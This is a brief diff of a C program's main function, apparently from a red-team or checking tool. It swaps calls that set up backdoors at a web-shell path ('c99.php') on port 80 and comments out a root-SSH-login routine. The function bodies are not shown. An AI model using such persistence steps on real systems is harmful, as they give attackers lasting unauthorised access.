@@ -15,12 +15,12 @@ void rootLoginSSH(){
 
 int main(){
 
-    backdoorWeb("/var/www/c99.php");
     //isPortOpen("80");
     //isPortOpen("22");
-    backdoorPort("/var/www/c99.php", "80");
+    backdoor("/var/www/c99.php", "80");
+    backdoor("/home/ubuntu/test.txt");
     //isStringInFile("/etc/ssh/sshd_config", "PermitRootLogin yes");
-    rootLoginSSH();
+    //rootLoginSSH();
 
     return 0;
 }
